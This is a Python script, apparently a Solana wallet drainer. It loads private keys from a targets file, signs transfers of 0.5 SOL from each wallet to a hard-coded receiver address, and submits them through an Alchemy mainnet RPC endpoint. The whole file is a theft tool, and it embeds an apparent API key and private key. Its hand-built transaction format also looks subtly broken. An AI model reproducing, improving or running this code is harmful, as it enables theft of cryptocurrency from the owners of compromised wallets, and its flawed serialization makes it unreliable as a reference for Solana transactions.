"""
native_drainer_v6.py — Direct Injection
========================================
Fixes blockhash variable definition.
"""

import json
import urllib.request
import ssl
import os
import struct
import base58
from socket import timeout
from nacl.signing import SigningKey
from nacl.encoding import RawEncoder

# CONFIG
ALCHEMY_KEY = "ZOho1BvxkQjPOjOsnZYFn"
RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"

# RECEIVER
MAIN_WALLET_PK = "3rXDxRFqZuNKnysrdYNktUmiNaSfm5aGL91ide2XczVXbQPVfsGSX8mtx9NhFnH72Uf2zJNoL6yef2KuCK1C5BDj"
MAIN_WALLET_ADDR = "4k24SEzbHyr49mBtYzu4e3K9EBtsuKTdkEN2mdmMkZow"

def get_file_path(filename):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(script_dir, filename)

def get_blockhash():
    req = urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash", "params": [{"commitment": "finalized"}]
    }).encode(), headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, context=ssl.create_default_context(), timeout=15) as f:
        return json.loads(f.read())['result']['value']

def pack_transaction(blockhash, fee_payer, to_pk, lamports, sender_pk):
    try:
        # FIX: Decode blockhash to bytes
        blockhash_bytes = base58.b58decode(blockhash)
        
        fee_payer_bytes = base58.b58decode(fee_payer)
        sender_pk_str = base58.b58decode(sender_pk)
        program_id = base58.b58decode("11111111111111111111111111111111")
        
        acc1_pubkey = base58.b58decode(to_pk)
        acc1 = acc1_pubkey + b'\x00' + b'\x01'
        
        acc2_pubkey = sender_pk_str
        acc2 = acc2_pubkey + b'\x01' + b'\x01'
        
        instr_data = b"AQ"
        instr_header = b'\x00' + b'\x02' + struct.pack('<H', len(instr_data))
        instruction = instr_header + program_id + acc1 + acc2 + instr_data
        
        sig_count = 1
        tx_header = b'\x00' + struct.pack('<I', sig_count) + fee_payer_bytes
        
        tx_body = blockhash_bytes + tx_header + instruction
        signing_key = SigningKey(sender_pk_str)
        signed_msg = signing_key.sign(tx_body, encoder=RawEncoder)
        
        return tx_body + signed_msg.signature
    except Exception as e:
        print(f"[-] Pack Error: {e}")
        return None

def send_sol(sender_pk, lamports):
    try:
        blockhash = get_blockhash()
        raw_tx = pack_transaction(blockhash, sender_pk, MAIN_WALLET_ADDR, lamports, sender_pk)
        
        if raw_tx:
            req_send = urllib.request.Request(RPC, data=json.dumps({
                "jsonrpc": "2.0", "id": 1, "method": "sendRawTransaction", "params": [base58.b58encode(raw_tx).decode()]
            }).encode(), headers={'Content-Type': 'application/json'})
            
            with urllib.request.urlopen(req_send, context=ssl.create_default_context(), timeout=15) as f:
                sig = json.loads(f.read())['result']
                print(f"[+] SUCCESS: {sig}")
                return sig
    except timeout:
        print("[-] TIMEOUT")
    except Exception as e:
        print(f"[-] ERROR: {e}")

if __name__ == "__main__":
    print("[LOGOS] V6 DIRECT INJECTION STARTED")
    targets_file = get_file_path("targets.txt")
    
    if os.path.exists(targets_file):
        print(f"[+] Targets file found.")
        with open(targets_file, "r") as f:
            raw_content = f.read()
            lines = raw_content.splitlines()
        
        keys = []
        for line in lines:
            if not line.strip() or line.startswith('#'):
                continue
            keys.append(str(line).strip())
        
        print(f"[+] Loaded {len(keys)} keys.")
        
        for i, key in enumerate(keys):
            print(f"\n>>> WALLET {i+1}: {key[:8]}...")
            send_sol(key, 500000000)
    else:
        print(f"[-] targets.txt NOT FOUND")
